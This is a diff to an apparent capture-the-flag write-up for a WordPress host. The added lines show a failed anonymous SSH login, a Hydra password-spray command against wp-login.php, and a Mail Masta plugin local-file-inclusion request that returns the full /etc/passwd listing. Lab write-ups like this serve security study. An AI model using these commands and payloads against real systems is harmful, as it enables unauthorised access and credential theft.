@@ -157,8 +157,16 @@ ftp>bye
 ```
 ### TCP/22
 * OpenSSH 7.6p1.
-  * Vulnerable to CVE-2018-15473 - username enumeration (https://www.exploit-db.com/exploits/4521080)
-  * Enumerate openSSH users?
+  * Could not connect anonymously.
+```
+ssh anonymous@TARGET_IP
+The authenticity of host 'TARGET_IP (TARGET_IP)' can't be established.
+ECDSA key fingerprint is SHA256:IVzQLYHc196APvwnH40vFHjOR4ZsfNqxHnOG3HuzXgg.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added 'TARGET_IP' (ECDSA) to the list of known hosts.
+anonymous@TARGET_IP's password: 
+Permission denied, please try again.
+```
 ### TCP/80
 * Search for hidden directories using Gobuster.
 ```
@@ -196,27 +204,40 @@ msf auxiliary(wordpress_login_enum) > exploit
 ```
 ## Vulnerablity Research
 ### vsftpd 3.0.3
-  * No public exploits listed on Exploit db.
+* No public exploits listed on Exploit db.
+### OpenSSH 7.6p1.
+* Vulnerable to CVE-2018-15473 - username enumeration (https://www.exploit-db.com/exploits/4521080)
+  * Enumerate openSSH users?
 ### Apache 2.4.29
-  * No public exploits on Exploit db.
+* No public exploits on Exploit db.
 ### WordPress
 * Use "wpscan" to identify vulnerabilites.
 ```
 wpscan --update
 wpscan --url http://TARGET_IP/Wordpress > wpscan.txt
 ```
-  * Insecure WordPress v5.5.1.
-    * No public exploits listed on Exploit db.
-  * twentytwenty theme v1.5 out of date as v2.5 is current.
-    * No public exploits listed on Exploit db.
-  * Mail Masta plugin v1.0.
-    * Vulnerable to [Local File Inclusion (LFI)](https://www.exploit-db.com/exploits/40290) public exploit listed on Exploit db.
-  * Reflex Gallery 3.1.7.
-    * No public exploits listed on Exploit db.
+* WordPress v5.5.1.
+  * v6.5 Beta 2 is current.
+  * No public exploits listed on Exploit db.
+* twentytwenty theme v1.5 out of date.
+  * v2.5 is current.
+  * No public exploits listed on Exploit db.
+* Mail Masta plugin v1.0.
+  * Vulnerable to [Local File Inclusion (LFI)](https://www.exploit-db.com/exploits/40290) public exploit listed on Exploit db.
+> The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.
+* Reflex Gallery 3.1.7.
+  * No public exploits listed on Exploit db.
 ## Exploitation
 ### Initial Access
 * password spray "/wordpress/wp-login.php" using Hydra
 ```
 hydra -l elyana -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2FTARGET_IP%2Fwordpress%2Fwp-admin%2F&testcookie=1:Error" -T 64 -vV
+```
+* Exploit Mail Masta LFI vulnerability.
+```
+http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+```
+```
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash mysql:x:110:113:MySQL Server,,,:/nonexistent:/bin/false sshd:x:112:65534::/run/sshd:/usr/sbin/nologin ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
 ```
 ## Privilege Escalation
